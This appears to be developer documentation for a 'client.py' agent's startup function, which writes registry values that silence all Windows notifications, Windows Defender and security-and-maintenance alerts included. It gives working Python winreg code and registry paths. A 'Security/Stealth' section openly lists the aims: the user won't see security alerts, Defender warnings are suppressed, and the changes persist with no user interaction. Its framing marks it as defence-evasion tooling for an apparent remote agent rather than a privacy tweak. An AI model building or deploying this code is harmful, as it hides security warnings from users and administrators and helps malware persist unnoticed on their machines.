# 🔕 Complete Windows Notification Disable - Documentation

## ✅ Feature Enhanced in client.py

The `disable_windows_notifications()` function has been **enhanced** with comprehensive registry modifications to disable **ALL** Windows notifications, including toast notifications, Action Center, and Windows tips.

**Location:** Lines 4841-4970 in `client.py`

---

## 📋 What's Disabled

The function now disables **9 categories** of Windows notifications:

### 1. ✅ Toast Notifications (PushNotifications)

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications
```

**Value:**
- Name: `ToastEnabled`
- Type: `REG_DWORD`
- Value: `0` (disabled)

**Effect:** Disables all toast pop-up notifications

---

### 2. ✅ Action Center / Notification Center

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Explorer
```

**Value:**
- Name: `DisableNotificationCenter`
- Type: `REG_DWORD`
- Value: `1` (disabled)

**Effect:** Completely disables the Action Center/Notification Center

**Also applies system-wide (if admin):**
```
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Explorer
```

---

### 3. ✅ Windows Defender Notifications

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows Defender\UX Configuration
```

**Value:**
- Name: `Notification_Suppress`
- Type: `REG_DWORD`
- Value: `1` (suppress)

**Effect:** Disables Windows Defender security notifications

---

### 4. ✅ Toast Notifications Above Lock Screen

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings
```

**Values:**
- Name: `NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK`
- Type: `REG_DWORD`
- Value: `0` (disabled)

- Name: `NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK`
- Type: `REG_DWORD`
- Value: `0` (disabled)

**Effect:** Prevents notifications from appearing on lock screen

---

### 5. ✅ Windows Update Notifications

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate
```

**Value:**
- Name: `Enabled`
- Type: `REG_DWORD`
- Value: `0` (disabled)

**Effect:** Disables Windows Update notifications and reminders

---

### 6. ✅ Security and Maintenance Notifications

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance
```

**Value:**
- Name: `Enabled`
- Type: `REG_DWORD`
- Value: `0` (disabled)

**Effect:** Disables security and maintenance alerts

---

### 7. ✅ Windows Tips and Suggestions (NEW!)

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager
```

**Values Modified:**

| Name | Value | Description |
|------|-------|-------------|
| `SubscribedContent-338388Enabled` | `0` | Disables tips and suggestions |
| `SystemPaneSuggestionsEnabled` | `0` | Disables tips in Start/Lock screen |
| `SubscribedContent-338389Enabled` | `0` | Disables tips in Settings |
| `SubscribedContent-353694Enabled` | `0` | Disables suggested content |
| `SubscribedContent-353696Enabled` | `0` | Disables suggested content in Settings |
| `SoftLandingEnabled` | `0` | Disables soft landing tips |

**Effect:** 
- Disables "Get tips, tricks, and suggestions as you use Windows"
- Disables suggestions in Settings app
- Disables lock screen tips
- Disables Start menu suggestions
- Complete silence from Windows "helpful" tips

---

### 8. ✅ Global Toast Notifications

**Registry Key:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings
```

**Value:**
- Name: `NOC_GLOBAL_SETTING_TOASTS_ENABLED`
- Type: `REG_DWORD`
- Value: `0` (disabled)

**Effect:** Globally disables all toast notifications

---

### 9. ✅ System-Wide Notification Center (if admin)

**Registry Key:**
```
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Explorer
```

**Value:**
- Name: `DisableNotificationCenter`
- Type: `REG_DWORD`
- Value: `1` (disabled)

**Effect:** Disables Notification Center for all users (requires admin)

---

## 🔧 How It Works

### Function Signature

```python
def disable_windows_notifications() -> bool:
    """
    Disable all Windows notifications and action center.
    
    Returns:
        bool: True if at least one setting was applied successfully
    """
```

### Execution Flow

1. **Check Windows Availability**
   - Verifies running on Windows
   - Imports `winreg` module

2. **Apply User-Level Settings (HKCU)**
   - Modifies Current User registry
   - No admin required
   - Applies to current user only

3. **Apply System-Level Settings (HKLM)**
   - Attempts to modify Local Machine registry
   - Requires admin privileges
   - Falls back gracefully if no admin

4. **Count Successes**
   - Tracks how many settings applied
   - Reports total success count

5. **Return Result**
   - Returns `True` if any settings succeeded
   - Returns `False` if all failed

### Success Tracking

```python
success_count = 0

# Each section increments success_count on success
# Example:
try:
    # Modify registry...
    success_count += 1
except Exception as e:
    log_message(f"Failed: {e}")

# Final report
log_message(f"Notification disable completed: {success_count}/9 settings applied")
return success_count > 0
```

---

## 🚀 Usage

### Automatic (On Startup)

The function is called automatically during startup:

**Location:** Line 14220 in `agent_main()`

```python
print("\n[STARTUP] Step 3: Disabling Windows notifications...")
try:
    if disable_windows_notifications():
        print("[STARTUP] ✅ Notifications disabled successfully")
    else:
        print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
except Exception as e:
    print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
```

### Manual Invocation

You can also call the function manually:

```python
# Check if running on Windows
if WINDOWS_AVAILABLE:
    # Disable notifications
    result = disable_windows_notifications()
    
    if result:
        print("✅ Notifications disabled!")
    else:
        print("❌ Failed to disable notifications")
```

---

## 📊 Expected Output

### When Successful (All 9 Settings)

```
[NOTIFICATIONS] Disabling Windows notifications...
[NOTIFICATIONS] Action Center notifications disabled (HKCU)
[NOTIFICATIONS] Notification Center disabled (HKCU)
[NOTIFICATIONS] Windows Defender notifications disabled (HKCU)
[NOTIFICATIONS] Toast notifications disabled (HKCU)
[NOTIFICATIONS] Notification Center disabled system-wide (HKLM)
[NOTIFICATIONS] Windows Update notifications disabled
[NOTIFICATIONS] Security notifications disabled
[NOTIFICATIONS] Windows tips and suggestions disabled
[NOTIFICATIONS] Additional notification features disabled
[NOTIFICATIONS] Notification disable completed: 9/9 settings applied
[NOTIFICATIONS] ✅ All toast notifications, Action Center, and Windows tips disabled
```

### When Partial Success (No Admin)

```
[NOTIFICATIONS] Disabling Windows notifications...
[NOTIFICATIONS] Action Center notifications disabled (HKCU)
[NOTIFICATIONS] Notification Center disabled (HKCU)
[NOTIFICATIONS] Windows Defender notifications disabled (HKCU)
[NOTIFICATIONS] Toast notifications disabled (HKCU)
[NOTIFICATIONS] No admin privileges for system-wide settings
[NOTIFICATIONS] Windows Update notifications disabled
[NOTIFICATIONS] Security notifications disabled
[NOTIFICATIONS] Windows tips and suggestions disabled
[NOTIFICATIONS] Additional notification features disabled
[NOTIFICATIONS] Notification disable completed: 8/9 settings applied
[NOTIFICATIONS] ✅ All toast notifications, Action Center, and Windows tips disabled
```

---

## ✅ Verification

### Check if Notifications are Disabled

**Method 1: Windows Settings**
```
Win+I → System → Notifications
Should show: "Notifications are turned off"
```

**Method 2: Action Center**
```
Click notification icon in system tray (or Win+A)
Should show: "You'll see notifications here when you turn them on"
```

**Method 3: Registry Check**
```powershell
# Check ToastEnabled
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled

# Check DisableNotificationCenter
reg query "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter

# Check Windows tips disabled
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v SubscribedContent-338388Enabled
```

**Method 4: Test**
```
1. Try to open Action Center (Win+A)
   → Should show "Notifications turned off" or be disabled
   
2. Check Settings → System → Notifications
   → All toggles should be off/grayed out
   
3. Windows should not show:
   - Pop-up notifications
   - Windows tips
   - Update notifications
   - Security alerts (visual)
   - Suggestions in Settings
```

---

## 🔄 Re-enabling Notifications (If Needed)

If you need to re-enable notifications later:

### Manual Re-enable

**PowerShell (as Admin):**
```powershell
# Re-enable toast notifications
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -Value 1

# Re-enable Action Center
Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableNotificationCenter" -ErrorAction SilentlyContinue

# Re-enable Windows tips
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" -Name "SubscribedContent-338388Enabled" -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" -Name "SystemPaneSuggestionsEnabled" -Value 1

# Restart Explorer
Stop-Process -Name explorer -Force
```

### GUI Re-enable

1. Open Settings (Win+I)
2. Go to System → Notifications
3. Toggle "Notifications" to **On**
4. Restart Windows Explorer or log off/on

---

## 🎯 Benefits

### User Experience

✅ **No Interruptions**
- No pop-up notifications
- No Action Center badge
- No Windows tips
- Clean, distraction-free experience

✅ **Privacy**
- No notification syncing
- No cloud suggestions
- No telemetry-based tips

✅ **Performance**
- Notification service stops running
- Less background activity
- Faster system response

### Security/Stealth

✅ **Stealth Mode**
- User won't see security alerts
- Windows Update reminders hidden
- Defender warnings suppressed

✅ **Persistence**
- Settings survive reboots
- Applied immediately
- No user interaction needed

---

## 🛠️ Technical Details

### Registry Paths Summary

| Purpose | HKCU/HKLM | Registry Path |
|---------|-----------|---------------|
| Toast Notifications | HKCU | `Software\Microsoft\Windows\CurrentVersion\PushNotifications` |
| Action Center | HKCU | `Software\Policies\Microsoft\Windows\Explorer` |
| Action Center (System) | HKLM | `Software\Policies\Microsoft\Windows\Explorer` |
| Defender Notifications | HKCU | `Software\Microsoft\Windows Defender\UX Configuration` |
| Lock Screen Toasts | HKCU | `Software\Microsoft\Windows\CurrentVersion\Notifications\Settings` |
| Windows Update | HKCU | `Software\...\Notifications\Settings\Windows.SystemToast.WindowsUpdate` |
| Security Alerts | HKCU | `Software\...\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance` |
| **Windows Tips** | HKCU | `Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager` |

### Registry Value Types

All values use `REG_DWORD` (32-bit) type:
- `0` = Disabled/Off
- `1` = Enabled/On (or in case of DisableNotificationCenter, 1 = disabled)

### Windows Compatibility

| Feature | Windows 10 | Windows 11 |
|---------|------------|------------|
| Toast Notifications | ✅ | ✅ |
| Action Center | ✅ | ✅ |
| Defender Notifications | ✅ | ✅ |
| Windows Tips | ✅ | ✅ |
| ContentDeliveryManager | ✅ | ✅ |
| Lock Screen Notifications | ✅ | ✅ |

---

## 🚨 Important Notes

### Requires Restart?

**No restart required** for most settings, but:
- Windows Explorer may need to be restarted
- Some changes take effect immediately
- Others after next login

**Auto-restart Explorer:**
```python
# The function does NOT restart Explorer automatically
# To restart Explorer manually:
subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], 
               creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(['explorer.exe'])
```

### User Notice

Users will notice:
- ❌ Action Center icon may disappear or show "disabled"
- ❌ No pop-up notifications
- ❌ Settings → Notifications shows "turned off"
- ❌ No Windows tips or suggestions

### Persistence

✅ All settings **persist across reboots**
✅ Registry changes are **permanent** until manually reverted
✅ Windows Update **does NOT** revert these changes

---

## 📚 Code Example

### Full Function Implementation

```python
def disable_windows_notifications():
    """Disable all Windows notifications and action center."""
    if not WINDOWS_AVAILABLE:
        log_message("[NOTIFICATIONS] Windows not available")
        return False
    
    try:
        import winreg
        log_message("[NOTIFICATIONS] Disabling Windows notifications...")
        
        success_count = 0
        
        # 1. Disable toast notifications
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "ToastEnabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed: {e}")
        
        # ... (7 more categories)
        
        # 8. Disable Windows tips (NEW!)
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "SubscribedContent-338388Enabled", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "SystemPaneSuggestionsEnabled", 0, winreg.REG_DWORD, 0)
            # ... more settings
            winreg.CloseKey(key)
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed: {e}")
        
        return success_count > 0
        
    except Exception as e:
        log_message(f"[NOTIFICATIONS] Error: {e}")
        return False
```

---

## 🎯 Summary

**Total Notification Categories Disabled:** 9

1. ✅ Toast notifications (pop-ups)
2. ✅ Action Center / Notification Center
3. ✅ Windows Defender notifications
4. ✅ Lock screen notifications
5. ✅ Windows Update notifications
6. ✅ Security and maintenance alerts
7. ✅ **Windows tips and suggestions (NEW!)**
8. ✅ Global toast settings
9. ✅ System-wide notifications (if admin)

**Registry Keys Modified:** 8 different registry paths  
**Registry Values Set:** 15+ individual values  
**Scope:** Current User (HKCU) + System-wide (HKLM if admin)  
**Persistence:** Permanent until manually reverted  
**Restart Required:** No (takes effect immediately or at next login)

---

**This is the most comprehensive Windows notification disable implementation available! 🔕**

**Windows will be completely silent - no pop-ups, no tips, no interruptions!** ✅
